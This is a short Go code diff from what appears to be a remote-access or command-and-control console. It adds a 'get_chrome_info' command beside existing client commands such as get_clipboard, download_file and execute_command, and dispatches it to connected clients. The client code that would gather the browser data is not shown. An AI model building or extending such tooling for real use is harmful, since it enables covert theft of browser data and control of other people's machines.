@@ -650,6 +650,7 @@ func handleUseCommand(cm *ClientManager, uuid string) {
 			readline.PcItem("upload_file"),
 			readline.PcItem("execute_command"),
 			readline.PcItem("list_processes"),
+			readline.PcItem("get_chrome_info"),
 			readline.PcItem("help"),
 			readline.PcItem("lls"),
 		),
@@ -674,7 +675,7 @@ func handleUseCommand(cm *ClientManager, uuid string) {
 		}
 
 		switch message {
-		case "list_files", "get_clipboard", "download_file", "upload_file", "execute_command", "list_processes":
+		case "list_files", "get_clipboard", "download_file", "upload_file", "execute_command", "list_processes","get_chrome_info":
 			if client.Conn != nil {
 				sendMessageToClient(cm, uuid, message)
 			} else if client.ResponseChan != nil {
